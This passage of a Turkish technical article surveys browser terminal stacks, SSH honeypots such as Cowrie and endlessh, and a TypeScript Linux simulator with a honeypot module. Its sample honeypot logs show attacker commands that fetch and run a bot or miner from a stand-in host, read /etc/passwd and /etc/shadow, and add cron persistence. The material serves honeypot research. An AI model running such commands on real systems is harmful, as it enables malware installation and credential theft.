| **Başlatma süresi** | 15-40 sn | 10-30 sn | 10-30 sn | 15-40 sn | 2-5 sn | 10-40 sn |
| **Açık kaynak** | ✅ | ✅ | ✅ | ❌ | kısmi | ✅ |
| **Durum** | ✅ çok aktif | ✅ kararlı | ⚠️ arşivli | ✅ ticari | ✅ aktif | ✅ aktif |

Bu tabloda göze çarpan: `v86` hem npm paketi olan, hem tarayıcı ve Nodeda dönen hem açık kaynak tek emülatördür. "JavaScript içinde Linux emülatörleri" konuşmasına hâkim olmasının sebebi budur. Geri kalanın handikapı vardır: JSLinuxun APİsi yok, jor1k arşivli, CheerpX para tutar, WebContainers yalnızca tarayıcı ve Nodea özgü, container2wasm derleme adımı ve CLI gerektirir. Sadece "JavaScriptte Linux başlatmaya" ihtiyacın varsa `v86` neredeyse hep doğru başlangıç noktasıdır.

---

## Kısım 3: Terminal yığınları, xterm.js ve node-pty

İki paket insanlar kabuk benzeri deneyimler inşa ederken sürekli döner. Bunlar kum havuzu ya da emülatör değildir: kullanıcı arayüzü ve PTY tesisatıdır: ama o kadar ilişkililer ki dışarıda bırakırsam içim rahat etmez. Ayrıca ikisini de kullandım ve gerçekten iyiler.

### 3.1 `xterm.js`: terminal render

xterm.js tarayıcı için terminal emülatörüdür. `<canvas>` öğesinde terminal ekranı (VT100/xterm kaçış dizileri) gösterir, klavye girdisini yönetir ve veri yönlendirmek için API sunar.

Kullananlar: VS Code gömülü terminali, Azure Cloud Shell, Proxmox VE, AWS CloudShell ve daha niceleri.

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// Terminale veri gönder (metin olarak gösterilir)
term.write("$ ");
term.onData(data => {
  // veri tuş vuruşlarıdır: backende gönder
  socket.send(data);
});
socket.onmessage(msg => {
  // backend çıktısı: göster
  term.write(msg.data);
});
```

xterm.js yalnızca render katmanıdır. Kabuk çalıştırmaz. Komut yorumlamaz. Seçtiğin backende bağladığın görüntüleme widgetıdır. Birçok insan xterm.jsin "terminali yaptığı" sanır ama gerçekten sadece ekrandır: komutları gerçekten çalıştıran bir şeye bağlamak zorundasın.

**npm**: [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)
**GitHub**: [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty`: PTY oluşturma

`node-pty` Node.js içinde sözde terminal (PTY) yaratır ve üstünde okuma/yazma handleı verir. xterm.js ile kullanılınca sunucuda dönen gerçek kabuğa (bash, zsh, fish) konuşan tarayıcı terminali inşa etmeye izin verir.

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // WebSocket üzerinden tarayıcı xterm.jse gönder
  ws.send(data);
});

ws.on("message", data => {
  // Tarayıcı tuş vuruşlarını kabuğa ilet
  shell.write(data);
});
```

Bu bulut IDEler ve web terminalleri için standart şemadır: xterm.js (tarayıcı) ↔ WebSocket ↔ node-pty ↔ gerçek bash. İzolasyon hâlâ yoktur. Kabuk Node.js sürecinin (ya da onu çalıştıran kullanıcının) tüm izinleriyle çalışır.

**Bakımını yapan**: Microsoft.
**npm**: [node-pty](https://www.npmjs.com/package/node-pty)
**GitHub**: [microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## Kısım 4: SSH honeypotları

Honeypotlar saldırıya uğramak için tasarlanır. Amaç saldırganların etkileşime girecek kadar gerçek görünmek ve tehdit istihbaratı için yaptıkları her şeyi kaydetmektir. SSH birincil hedeftir çünkü internette en çok saldırılan servistir: 22. portu herkese açık IPde sunarsan dakikalar içinde kelimenin tam anlamıyla otomatik tarama girişimleri görürsün. Bir gün dene, ne kadar hızlı geldiği epey korkutucudur.

Honeypot kalitesi iki şeyle ölçülür: **sadakat** (gerçek sistemi ne kadar ikna edici taklit eder) ve **telemetri** (ne kadar faydalı veri yakalar). Bu ikisi gerilimlidir. Yüksek sadakatli honeypot inşa etmesi zor ve işletmesi risklidir.

Bu bölüm beni sonunda `typescript-virtual-container` içinde `HoneyPot` modülünü inşa etmeye götüren şeydir, o yüzden burada birkaç fikrim var.

### 4.1 Cowrie: altın standart

Cowrie Python tabanlı orta-yüksek etkileşimli SSH ve Telnet honeypottur. Araştırma ve güvenlik topluluğunda en çok dağıtılan SSH honeypottur.

Mimari:
- **Protokol katmanı**: gerçek SSH protokol uygulaması (Twisted Conch), o yüzden saldırganlar gerçek el sıkışma, gerçek anahtar değişimi, gerçek kimlik doğrulama alır
- **Kabuk katmanı**: sahte dosya sistemi (Debian 5.0 benzeri) ve yaygın komutlara yanıt veren kısmi kabuk yorumlayıcı
- **Vekil modu**: arkasında gerçek sisteme yönlendirebilir (yüksek etkileşim modu), geçen her şeyi kaydeder
- **LLM modu** (yeni ekleme): işlemeyi bilmediği komutlara dinamik yanıt üretmek için dil modeli kullanır: evet, Cowrienin artık yapay zekâ modu vardır. Çılgın bir çağda yaşıyoruz.

```python
# Cowrienin yakaladığı şey
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie indirilen dosyaları (wget/curl/SFTP/SCP üzerinden) zararlı yazılım analizi için saklar. Splunk, Elasticsearch ve diğer SIEM platformlarıyla bütünleşir.

**Sadakat**: orta-yüksek. Otomatik botları kandıracak kadar ikna edici (SSH saldırganlarının %99u budur: çoğu `root`/`password` deneyen aptal scriptlerdir). Sofistike insanlar parmak iziyle tanımlayabilir ama genelde epey hızlıdır.

**Dil**: Python (Twisted)
**GitHub**: [cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo: Cowrie öncülü

Kippo, Cowrienin tabanlandığı orijinal orta etkileşimli SSH honeypottur. Aynı temel fikir: gerçek SSH protokolü, sahte dosya sistemi, kısmi kabuk. Cowrie bu noktada tamamen yerini aldı: Kippo arşivlendi ve 2026da kimse kullanmamalıdır. Sırf tarihsel eksiksizlik için anıldı çünkü eski blog yazıları ve güvenlik makalelerinde başvurulduğunu görebilirsin.

**GitHub**: [desaster/kippo](https://github.com/desaster/kippo): arşivli

---

### 4.3 endlessh: SSH çukur madeni

endlessh yozlaşmış bir honeypottur: SSH bağlantılarını banner verisini saniyede 1 bayt (ya da daha yavaş) yavaş yayınlayarak açık tutar. Ona bağlanan SSH istemcisi süresiz takılı kalır: sunucu banner göndermeyi hiç bitirmediği için kimlik doğrulamaya asla ulaşamaz.

Amaç tehdit istihbaratı değil saf kaynak inkârıdır: saldırganların tarama threadlerini meşgul edip gerçek hedeflere o kadar hızlı ulaşamamalarını sağlamak. Dürüstçe iyi anlamda biraz şeytancadır. Saldırgandan hiçbir şey öğrenmezsin: sadece zamanını harcarsın. Bunda derinden tatmin edici bir şey vardır.

```c
// endlesshin tüm protokol davranışı:
// Gönder: "SSH-2.0-OpenSSH_" sonra yavaş rastgele karakter ekle
// Bağlantıyı asla kapatma
// Saldırganın tarayıcısı N saniye sonra zaman aşımına uğrar
```

Komut yakalanmaz. Kimlik doğrulama test edilmez. Sadece bağlantı süresi.

**Yazıldığı dil**: C
**GitHub**: [skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame: "herkesi içeri al" honeypotu

sshesame tüm SSH bağlantılarını kabul eder (herhangi kullanıcı, herhangi parola, herhangi anahtar) ve her şeyi kaydeder. Sıfır etkileşimli honeypottur: komutlara yanıt vermez, saldırganların "girmesine" izin verip yazdıkları her tuş vuruşunu kaydeder.

```
2024-01-15 03:22:11 45.33.32.156 bağlantısı
  Kullanıcı: root, Parola: password123 -- kabul edildi
  Yazılan komutlar:
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  47 sn sonra bağlantı kesildi
```

Kimlik bilgisi hasadı için faydalı: botların denediği kullanıcı adı ve parolaları hızla biriktirirsin, bu da hangi varsayılan kimlik bilgilerinin aktif kaba kuvvet altında olduğunu söyler. Spoiler: hep `root`/`password`, `admin`/`admin` ve `root`/`123456`tur. Her seferinde.

**GitHub**: [jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird: Docker tabanlı honeypot çerçevesi

`lyrebird/honeypot-base`, ağ servisi honeypotları inşa etmek için Docker taban imajıdır. Özellikle SSH honeypotu değildir: herhangi bir protokol için honeypot inşa etme çerçevesidir.

Taban imaj günlükleme çerçevesi, protokoller için eklenti sistemi ve çok servisli honeypotlar için Docker Compose yapılandırmaları sağlar. Belirli servisleri simüle etmek için genişletirsin.

**Docker Hub**: [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Node.js içinde SSH honeypotu inşa etmek: naif yöntem ve neden başarısız olur

`typescript-virtual-container` öncesinde Node.js içinde SSH honeypotu inşa etmek gerçek `ssh2` kütüphanesini manuel komut simülasyonuyla birleştirmek demekti. Çok sıkıcı, çok eksik ama... bu aşamada geçilmesi gereken yol:

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // Girişimi kaydet
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // Herkesi içeri al
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // Simüle yanıt
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

Bu kimlik bilgilerini ve komutları yakalaması anlamında "işe yarar". Ama sofistike saldırgan biraz kazınca bariz sahtedir. `uname -a` doğru dizeyi döndürür ama `ls /etc` "command not found" döndürür: buram buram tuzak kokar. Dosya sistemi yoktur. Komutlar zincirlenmez. Pipelar çalışmaz. Değişkenler genişlemez.

Yetkin saldırgan honeypotunu ilk beş komutta tanımlar. Cowrie benzeri davranış arayan otomatik scriptler de hemen tespit eder. Görünüşe göre `typescript-virtual-container` yazarını komutları gerçekten yorumlayan bir şey inşa etmeye iten budur: bu konuda Kısım 5te daha fazla.

---

### Honeypot ailesinin özeti

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | Naif ssh2 |
|---|---|---|---|---|---|---|
| **Etkileşim seviyesi** | orta-yüksek | orta | sıfır | sıfır | değişken | düşük |
| **Gerçek SSH protokolü** | ✅ | ✅ | ❌ (çukur) | ✅ | değişken | ✅ |
| **Kabuk sadakati** | orta | orta | uygulanamaz | hiç | değişken | minimal |
| **Kimlik bilgilerini yakalar** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **Komutları yakalar** | ✅ | ✅ | ❌ | ✅ | değişken | ✅ |
| **Zararlıları yakalar** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **SIEM entegrasyonu** | ✅ yerel | ❌ | ❌ | ❌ | ❌ | manuel |
| **LLM yanıtları** | ✅ (yeni) | ❌ | ❌ | ❌ | ❌ | ❌ |
| **Dil** | Python | Python | C | Go | Docker | Node.js |
| **Yerel Node.js** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Durum** | ✅ çok aktif | ⚠️ arşivli | ✅ aktif | ✅ aktif | ✅ aktif | Kendin yap |

Buradaki desen epey nettir: sadakat istedikçe Python yazmak gerekir. Ciddi yapıyorsan Cowrie tartışmasız kazanan: sahada yıllarca sınandı ve basit kimlik bilgilerinden çok fazlasını yakalar. endlessh ve sshesame ciddi tehdit istihbaratı araçlarından çok hoş projelerdir. Ve Node.js naif yaklaşımı duvara çarpmadan önce belki yolun %20sine götürür.

---

## Kısım 5: `typescript-virtual-container`, boşluğu dolduran

Tamam işte işler ilginçleşir. Yukarıdaki tüm aileleri katalogladıktan sonra eksik çeyrek epey belli olur:

- JS kum havuzları: kodu izole eder, kabuk yok, dosya sistemi yok, SSH yok
- Linux emülatörleri: gerçek işletim sistemi, gerçek kabuk, gerçek SSH... ama 150+ MB RAM, 30 saniye başlatma ve seri G/Ç üstüne kendi APIni inşa etmen gerekir
- Honeypotlar: sahte kabuk, programlanabilir API yok, Python/Go/C, yerel Node değil

Kimse gerçek SSHli, gerçek izinli, gerçek sanal ağlı, tipli TypeScript APIli tam programlanabilir yerel Node Linux ortamı inşa etmemişti. O inşa etti.

Kısa tanıtım çünkü ilk kez düzgün andığım yerdir: `typescript-virtual-container`, çevrimiçi **Fortune** (ya da ItsRealFortune) diyen Fransız geliştirici [Chloé Rolzhausen](https://itsrealfortune.fr) tarafından inşa edildi. Onu [web sitesinde](https://itsrealfortune.fr) ve [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/) üzerinde bulabilirsin. Tüm proje: 56.000 satır TypeScript, 247 dosya, 170 komut, tek kişinin solo emeğiydi. Makalenin geri kalanında ona Fortune diyeceğim. Ve evet, epey çılgınca. İşi gözden geçir!

### Gerçekte nedir

`typescript-virtual-container`, saf TypeScript yazılmış **Linux ortam simülatörüdür**. Wasm yok, yerel uzantı yok, çekirdek yok. 247 TypeScript dosyasına dağılmış ~56.000 satır kaynak.

Kilit içgörü: `ls /etc | grep passwd` çalıştırmak için CPU emülatörüne ihtiyacın yoktur. İhtiyacın:
1. Yol işlemlerine yanıt veren bellekte düğüm ağacı
2. Her erişimde uygulanan POSIX izin modeli
3. Pipeları, yönlendirmeleri, alt kabukları ve değişken genişletmeyi anlayan kabuk sözdizimi ayrıştırıcısı
4. ~170 komut uygulaması (fonksiyonlar, ikililer değil)
5. Kullanıcı ve grup yönetim sistemi
6. Bütün bunları SSH üzerinden sunacak bir şey

Bunların hepsi çekirdek karışmadan saf TypeScriptte yapılabilir.

### VirtualFileSystem

VFS, tipli düğümlerin bellekte ağacıdır: `"fs"` kalıcılık modu açıkça etkinleştirilmedikçe disk G/Ç yok:

```ts
// Basitleştirilmiş dahili temsil
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // tembel yüklenen yer tutucu
```

Her yol işlemi `normalizePath` (`.`, `..`, sembolik bağları çözer) ve `enforceAccess` (isteyen uid/gidye karşı okuma/yazma/çalıştırma izinlerini doğrular) üzerinden geçer. `chmod`, `chown`, yapışkan bitler ve setuid hepsi uygulanır ve gerçekten uygulanır. uid 1000 ile dönen süreç kip 0600 root dosyasını okumaya çalışırsa EACCES alır: sahte EACCES değil, izin kontrolünden fırlatılan gerçek JavaScript `Error`. Bu kısım dürüstçe epey zariftir.

VFS şuna serileşir:
- `.vfsb`: kompakt ikili format (fflate sıkıştırmalı özel): varsayılan format budur
- JSON anlık görüntüsü: insanca okunur, hata ayıklamaya iyi
- TAR arşivi: gerçek tar formatıyla içe/dışa aktarma, yani bir şeyi `tar -xf` edebilirsin ve VFS sadece... o dosyalara sahiptir
- SquashFS imajı: salt okunur içe aktarma

`"fs"` kalıcılık modunda çökmeden kurtarma için yazmadan önce günlüğü (WAL) tutar: yazmalar önce günlüğe, sonra flush sırasında anlık görüntüye gider. Node işlemin ortasında çökerse günlük son eksiksiz durumu yeniden kurmaya izin verir.

Disk G/Ç gecikmesini simüle eden `FileCache` katmanı da vardır. `NVME_DISK_IO` ya da `HDD_DISK_IO` gibi profiller yapılandırırsın ve VFS gerçekçi zamanlamalara uymak için dosya işlemlerini yapay geciktirir. Bu epey komiktir: donanımı simüle etmek için kendini bilinçli yavaşlatan yazılım: ama kıyaslama için aslında çok faydalıdır.

### Kabuk yorumlayıcı

Kabuk sözdizimi ayrıştırıcısı tipli AST üretir:

```ts
// "ls /etc | grep root && echo done" şuna ayrışır:
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

Yürütücü bu ASTyi gezer:
- Pipeline için `{ stdin, stdout, stderr }` akış zinciri yaratır ve her komutu pipelı G/Ç ile çalıştırır
- Mantıksal işleçler (`&&`, `||`) için sağı çalıştırmadan önce soldan sonra `$?` kontrol eder
- Alt kabuklar (`$(...)`, `` ` ` ``) için yürütme bağlamını çatallar
- Yönlendirmeler (`>dosya`, `>>dosya`, `2>&1`, `<dosya`) için yürütmeden önce akış kablolamasını ayarlar
- Arka plan görevleri (`cmd &`) için bitmesini beklemeden çalışır
- Değişkenler için `$VAR`, `${VAR:-default}`, `${#VAR}` ve aritmetik `$((expr))` genişletir
- Küme genişletme (`{a,b,c}`, `{1..5}`) için çalıştırmadan önce tam genişleme listesi üretir

Bunların hepsi gerçek POSIX kabuk davranışıdır. Ayrıştırıcı heredocları, süreç ikamesini, globbingi (`*`, `?`, `[abc]`) ve tırnak yönetimini işler ( enterpolasyonlu tek tırnaklar, çift tırnaklar, ters bölü kaçışı). Mükemmel değildir: uç durumlar vardır: ama TypeScript projesinden bekleyeceğinden çok ötededir.

### ~170 yerleşik komut

Komutlar komut kaydına kayıtlı TypeScript fonksiyonlarıdır. stdin/stdout/stderr akışları, VFS, kullanıcı oturumu, kabuk ortamı ve alt modüllere erişimli `CommandContext` alırlar.

170 Unix komut uygulaması yazmak... çoktur. Bazıları önemsizdir (`echo`, `true`, `false`), bazıları şaşırtıcı karmaşıktır (`awk`, `find`, `tar`). Yani eksiksiz POSIX `awk` mı? TypeScriptte? Bu dürüstçe çılgıncadır. İşte içindekilerden örnek:

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (istemci tarafı, giden bağlantı),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (saplama), python3 (saplama), node (saplama),
nano (eksiksiz etkileşimli editör), vim (temel), vi (temel),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (simüle), systemctl (saplama), journalctl (saplama),
...ve yaklaşık 130 tane daha
```

"Saplamalar" (git, python3, node) yaygın çağrılara gerçekçi yanıt verir: `python3 --version` inandırıcı sürüm dizesi döndürür, `git status` sahte depo durumu gösterir: gerçek iş yapmadan. Honeypot için aslında gerçek komutlardan daha faydalıdır çünkü saldırganların tehlikeli bir şey çalıştırmadan neyi çalıştırmaya çalıştığını gözlemlemeye izin verir.

### SSH sunucusu

SSH katmanı gerçek npm `ssh2` paketi kullanır: gerçek SSH protokolü, gerçek anahtar değişimi, gerçek şifreleme. `SSHMimic` onu sarar:

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// Gerçek SSH : ssh -p 2222 root@localhost
// Gerçek SFTP : sftp -P 2222 root@localhost
// Gerçek SCP : scp -P 2222 file root@localhost:/tmp/
```

`shellProperties`, `uname -a`, `lsb_release -a`, `neofetch`, `/proc/version` ve `/etc/os-release` ne raporlar belirler. Herhangi Linux dağıtımı ve çekirdek sürümünü ikna edici taklit edebilirsin: gerçek SSH istemcisi için kelimenin tam anlamıyla farkı anlamanın yolu yoktur.

### HoneyPot modülü

Kabuk yorumlayıcı gerçek ve SSH sunucusu gerçek olduğu için saldırgan komutları sanal ortamda gerçekten çalışır. Saldırganca tetiklenen `wget` istekleri hedef URLlerle günlüğe kaydedilir. Saldırganca oluşturulan dosyalar VFSye kaydedilir. Saldırganın yetki yükseltme girişimleri gerçekçi hatalar üretir.

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// Oturum sonrası dosya sistemini karşılaştır
const before = shell.vfs.toSnapshot();
// ... saldırgan oturumu ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

Bu Cowrieden nitel farklıdır. Cowrienin sahte dosya sistemi `ls` yanıtlayabilir ama saldırganın oluşturduğu dosyaları ve yaptığı değişiklikleri yapılandırılmış diff olarak gerçekten izleyemez. `typescript-virtual-container` yapabilir çünkü VFS yaşayan bir veri yapısıdır: her yazma izlenir. Saldırganın az önce eklediği cron girdisi mi? Difftedir. `.hidden` klasörü mü? Difftedir. Zararlı yazılım analizi için epey faydalı.

### Sanal ağ yığını

Bu muhtemelen tüm projenin en etkileyici kısmıdır ve bu alandaki başka hiçbir projede eşdeğeri yoktur. Yani gerçek ağ kartı karışmadan saf TypeScript yazılmış eksiksiz L2/L3 sanal ağ yığını, VPN destekli. Gerçekten çılgınca.

`VirtualNetworkManager`, her `VirtualShell` örneğine yapılandırılabilir IP adresli sanal ağ arayüzleri, yönlendirme tabloları ve yazılım güvenlik duvarı (conntrack ve NATli iptables tarzı kurallar) verir. `ip addr`, `ip route`, `iptables -L`, `netstat -rn` hepsi sanal ağ durumunu gösterir.

`VirtualSwitch` (adı Baie: sunucu kabini Fransızca kelimesinden, "baie informatique") birden çok kabuğu paylaşılan alt ağda bağlar. Şunları uygular:
- MAC öğrenme ve ARP
- Alt ağlar arası IP yönlendirme
- NAT (giden maskeleme)
- DNS (alt ağ başına yapılandırılabilir kayıtlar)
- Yük dengeleme (round-robin, en az bağlantı)
- Trafik şekillendirme: gecikme, titreme (gauss dağılımı), paket kaybı, toplu kayıp, yeniden sıralama, kopyalama
- Bant genişliği sınırlama (jeton kovası)
- MTU uygulama
- Bağlantı izleme (durumlu, NEW/ESTABLISHED/TIME_WAIT durumları)

```ts
const baie = new Baie("192.168.0.0/24");

// Aynı anahtarda üç sanal makine
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// Güvenlik duvarı: web apiye ulaşabilir, api dbye ulaşabilir, web dbye doğrudan ulaşamaz
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// Trafik şekillendirme: dışarıya kararsız WAN bağı simüle et
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn`, Baie örnekleri arasında şifreli tüneller yaratır: siteler arası VPN bağlantılı çok siteli ağ simüle edebilirsin.

`VirtualProxy`, port yönlendirme ve SOCKS5 vekili uygular.

Bunların hiçbiri gerçek ağ kartına dokunmaz. Hepsi TypeScript nesne yönlendirmedir. `ping` komutu sanal anahtar üzerinden yönlendirilip simüle ICMP yanıtları döndürerek "çalışır". `curl http://192.168.0.3/api` sanal ağ üzerinden yönlendirilir, api kabuğunun simüle HTTP yanıtına ulaşır ve içeriği döndürür. En iyi anlamda sonuna kadar kaplumbağalardır.

### `SandboxedShell`

Daha güçlü izolasyona ihtiyaç duyulan programatik kullanım için `SandboxedShell` kabuk oturumunu Node.js Worker threadinde çalıştırır:

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // çekirdeğin %25i
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

Burada izolasyon VFS katmanı (worker thread kabuğu yalnızca sanal dosya sistemini görebilir, ana dosya sistemini asla) artı Node.js Worker thread bellek izolasyonuyla sağlanır. `isolated-vm`den hafiftir ama JS seviyesinden çok kabuk seviyesi izolasyon için daha uygundur.

### Kaynak sınırlama

Komutları raporlayan sistem izleme komutlarını etkileyen kabuk başına kaynak limitleri yapılandırabilirsin:

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

Bu kabuk içinde `free -m` 512 MB toplam RAM gösterir. `nproc` 2 döndürür. `/proc/meminfo` sınırlı değerleri gösterir. `htop` ve `top` sınırlı CPU sayısını gösterir. Simüle makinenin donanım ayak izini kesin tanımlamaya izin verir.

### Üç dağıtım modu

```
Mod 1 : SSH/SFTP Sunucusu
  VirtualSshServer / VirtualSftpServer
  → Gerçek SSH protokolü, gerçek SFTP, gerçek SCP
  → Kullanım durumları: honeypotlar, uzak test ortamları, eğitim laboratuvarları

Mod 2 : Web kabuğu (tarayıcı)
  builds/fortune-nyx-v1.7.8-web.min.js (ESM paketi)
  → Tarayıcıda döner, IndexedDBde kalıcı VFS
  → Kullanım durumları: etkileşimli öğreticiler, gömülü terminaller, demolar
  → Bonus: tam simüle XFCE masaüstü için startxfce4 çalıştırır

Mod 3 : Bağımsız CLI
  builds/fortune-nyx-v1.7.8-directbash-k6.1.0.mjs (tek dosya, kurulum yok)
  → curl ile çalıştır, VFSyi .vfs/ dizininde kalıcılaştır
  → Kullanım durumları: hızlı demolar, yerel deneme
```

### Polyfiller: tarayıcı derlemesi Wasmsız nasıl çalışır

Tamam bu gerçekten akıllıca bulduğum ve özel vurgulamak istediğim kısım.

Node.js kütüphanesini tarayıcıda çalıştırmak genelde kâbustur. Ya Wasm çalışma ortamı kullanırsın (ağır, yavaş yüklenir) ya her `node:*` içe aktarmayı tarayıcı uyumlu alternatifle değiştirmek için haftalar harcarsın. Fortune ikinci şeyi yaptı: ama çok temiz, depodaki `polyfills/` dizininde yaşayan özel polyfill kümesi yazarak.

Derleme pipelineı sadece bir sürü `alias` girdili esbuilddir:

```js
// demo/build.js: tarayıcı derlemesinin tüm yapılandırması
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

Wasm yok, harici polyfill kütüphanesi yok, `webpack-node-externals` başvurusu yok. Sadece takma adlı modüller ve birkaç enjekte global. Her birini detaylandırayım çünkü bazıları gerçekten etkileyici.

**`node:fs`: sahte dosya sistemi olarak IndexedDB**

Bu favorimdir. `node:fs` polyfilli Node.js senkron fs APIyi (`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...) iki katman destekli uygular: senkron okumalar için bellekte `Map` ve sayfa yeniden yüklemeleri arası kalıcılık için IndexedDB. Yazmalar hemen Mape gider (o yüzden `writeFileSync` hemen sonrası `readFileSync` hep çalışır), sonra arka planda asenkron IndexedDBye boşaltılır.

```js
// Senkron önbellek (yol → Uint8Array | null): anlık okumalar
const memCache = new Map();

// Başlangıçta IndexedDBden her şeyi memCache içine ön yükle
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

VFS anlık görüntüsünün tarayıcıda sayfa yeniden yüklemelerine dayanmasının nedeni budur: tüm `.vfsb` ikilisi bu polyfill üzerinden IndexedDBye yazılır ve sonraki yüklemede yeniden okunur. Wasm yok, sunucu yok. Sadece 2011den beri tüm tarayıcılarda olan IndexedDB.

**`node:crypto`: saf JSde SHA-256**

